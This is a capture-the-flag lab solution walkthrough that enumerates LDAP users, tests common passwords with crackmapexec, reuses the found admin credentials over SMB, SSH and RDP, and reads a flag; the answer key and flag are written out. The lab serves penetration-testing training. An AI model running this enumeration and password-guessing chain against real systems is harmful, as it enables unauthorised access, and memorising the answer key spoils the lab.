# Lab 8.4: Credential Discovery and Reuse Chain
## Learning Objectives
- Find credentials via enumeration, reuse across services
- Complete attack chain
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting the attack chain.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify services are running:**
   ```bash
   nmap -p 22,389,445,3389 <target_ip>
   ```

### Step 2: Enumerate LDAP

Perform LDAP enumeration to discover users for credential testing.

**Detailed Steps:**

1. **Verify ldapsearch is installed:**
   ```bash
   which ldapsearch
   ```

2. **Enumerate users via LDAP:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)"
   ```
   
   Replace `<target_ip>` with your actual target IP and `dc=example,dc=com` with the discovered base DN (e.g., `ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)"`)

3. **Expected output:**
   ```
   # admin, Users, example.com
   dn: cn=admin,ou=Users,dc=example,dc=com
   objectClass: person
   cn: admin
   uid: admin
   mail: admin@example.com
   ```

4. **Extract usernames:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)" | grep "^cn:"
   ```

   **Expected output:**
   ```
   cn: admin
   cn: user1
   cn: test
   ```

5. **Document discovered users:**
   - Username: `admin` (target for credential testing)
   - Other users: `user1`, `test`

### Step 3: Discover Credentials

Test common passwords for the discovered admin user.

**Detailed Steps:**

1. **Create password wordlist:**
   ```bash
   echo -e "password\nadmin\nadmin123\nqwerty\n123456\npassword123" > wordlist.txt
   ```

2. **Test credentials on SMB using crackmapexec:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

3. **Expected successful output:**
   ```
   SMB    <target_ip>  445  ...  [+] admin:password123
   ```

   A `[+]` result confirms the credentials are valid.

4. **Document discovered credentials:**
   - Username: `admin`
   - Password: `password123`
   - Source: LDAP enumeration + password testing

### Step 4: Reuse Across Services

Use the discovered credentials to access multiple services.

**Detailed Steps:**

1. **Test credentials on SMB using crackmapexec:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

   A `[+]` result confirms the credentials work on SMB.

2. **Test credentials on SSH:**
   ```bash
   ssh admin@<target_ip>
   # Password: password123
   exit
   ```

   A successful login confirms credential reuse on SSH.

3. **Test credentials on RDP:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password123
   ```

   The RDP window should open and log you in with the same credentials.

4. **Document credential reuse results:**
   ```
   Credential Reuse Results:
   - SMB: Works (verified via crackmapexec)
   - SSH: Works (verified via ssh login)
   - RDP: Works (verified via xfreerdp)
   ```

### Step 5: Retrieve Flag

The flag is located at `/tmp/private/flag.txt` and can be retrieved via SSH using the discovered credentials.

**Detailed Steps:**

1. **Connect via SSH:**
   ```bash
   ssh admin@<target_ip>
   # Password: password123
   ```

2. **Read the flag:**
   ```bash
   cat /tmp/private/flag.txt
   ```

3. **Expected flag content:**
   ```
   OCR{cr3d_ch41n}
   ```

4. **Exit the SSH session:**
   ```bash
   exit
   ```

### Step 6: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{cr3d_ch41n}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- Verified target IP and services accessibility (SSH, SMB, LDAP, RDP)
- Enumerated users via LDAP
- Discovered admin user from enumeration
- Tested common passwords and discovered password123 via crackmapexec
- Successfully reused credentials on SMB service
- Successfully reused credentials on SSH service
- Successfully reused credentials on RDP service
- Retrieved flag from /tmp/private/flag.txt via SSH
- Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Complete attack chain: enumeration → credential discovery → credential reuse
- LDAP enumeration provides target usernames
- Password testing discovers valid credentials
- Credential reuse enables access to multiple services
- Understanding the complete chain is essential for penetration testing
## Hints
1. Enumerate LDAP for users
2. Test common passwords
3. Reuse on multiple services
4. Flag in /tmp/private/flag.txt via SSH